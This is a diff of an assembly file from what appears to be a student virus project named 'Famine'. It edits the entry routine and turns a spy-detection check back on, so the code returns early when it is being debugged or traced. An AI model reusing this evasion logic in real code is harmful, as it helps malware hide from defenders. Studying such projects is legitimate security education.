@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/12/12 18:01:06 by anselme          ###   ########.fr        ;
+;    Updated: 2019/12/20 23:34:02 by anselme          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -20,11 +20,13 @@
 
 section .text
 	global famine_entry
-	global _start
+	global mark_below
+	global return_to_client
 
-extern detect_spy
-extern decypher
+extern _start
 extern virus
+extern decypher
+extern detect_spy
 
 famine_entry:
 ;------------------------------; Store variables
@@ -97,7 +99,7 @@ mark_below:
 
 	add rsp, 16
 %endif
-;------------------------------; check if client behaves well (comment for debug)
+;------------------------------; check if client behaves well
 	call detect_spy
 	test rax, rax
 	jnz return_to_client
